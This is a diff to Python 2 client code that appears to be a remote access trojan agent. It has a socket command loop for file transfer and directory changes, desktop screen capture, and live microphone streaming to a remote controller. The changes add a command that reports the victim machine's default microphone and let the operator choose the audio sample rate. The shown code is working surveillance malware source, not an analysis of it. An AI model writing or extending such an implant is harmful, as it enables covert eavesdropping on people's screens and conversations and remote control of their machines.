@@ -148,6 +148,10 @@ def download(sock, filename, end="[ENDOFMESSAGE]"):
     except:
         return 'downloadError'
 
+def getDefaultInputDevice():
+    p = pyaudio.PyAudio()
+    device_name = p.get_default_input_device_info()
+    return device_name['name']
 
 def ScreenBITS():
     hDesktopDC = User32.GetWindowDC(hDesktopWnd)
@@ -249,14 +253,20 @@ class childSocket(threading.Thread):
                         stdoutput = upload(self.socket, filename)
                     except:
                         stdoutput = 'downloadError'
+                elif data.startswith('getDefaultInputDeviceName'):
+                    stdoutput = getDefaultInputDevice()
                 elif data.startswith('startAudio'):
-                    audioThread = audioStreaming(self.socket)
-                    audioThread.start()
-                    stdoutput = 'audioStarted'
+                    print int(data.split(' ')[-1])
+                    try:
+                        audioThread = audioStreaming(self.socket, int(data.split(' ')[-1]))
+                        audioThread.start()
+                        stdoutput = 'audioStarted'
+                    except:
+                        stdoutput = 'audioError'
                 elif data.startswith('stopAudio'):
                     try:
                         audioThread.active = False
-                    except AttributeError:
+                    except:
                         pass
                     stdoutput = 'audioStopped'
                 elif data.startswith("cd"):
@@ -293,7 +303,7 @@ class childSocket(threading.Thread):
 
 
 class audioStreaming(threading.Thread):
-    def __init__(self, sock):
+    def __init__(self, sock, rate):
         super(audioStreaming, self).__init__()
 
         self.active = True
@@ -302,7 +312,7 @@ class audioStreaming(threading.Thread):
         self.chunk = 1024
         self.format = pyaudio.paInt16
         self.channel = 1
-        self.rate = 10240
+        self.rate = rate
 
         self.p = pyaudio.PyAudio()
 
